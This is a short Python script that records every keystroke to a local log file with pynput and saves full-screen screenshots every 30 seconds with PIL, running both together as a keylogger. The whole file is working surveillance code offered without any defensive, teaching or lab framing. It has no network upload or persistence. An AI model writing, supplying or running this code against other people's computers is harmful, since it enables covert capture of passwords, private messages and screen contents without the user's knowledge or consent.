import os
import time
from pynput import keyboard
from PIL import ImageGrab
from datetime import datetime

# Directory for screenshots
screenshot_dir = "screenshots"
os.makedirs(screenshot_dir, exist_ok=True)

# Log file
log_file = "keylog.txt"

# Capture keystrokes
def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char'):  # Printable characters
                f.write(key.char)
            else:  # Special keys (e.g., Enter, Shift)
                f.write(f" [{key}] ")
    except Exception as e:
        print(f"Error: {e}")

# Capture screenshots at intervals
def capture_screenshot():
    while True:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_path = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        time.sleep(30)  # Adjust interval (30 seconds)

# Start keylogger
def main():
    from threading import Thread
    # Start screenshot thread
    screenshot_thread = Thread(target=capture_screenshot, daemon=True)
    screenshot_thread.start()

    # Start keylogger
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
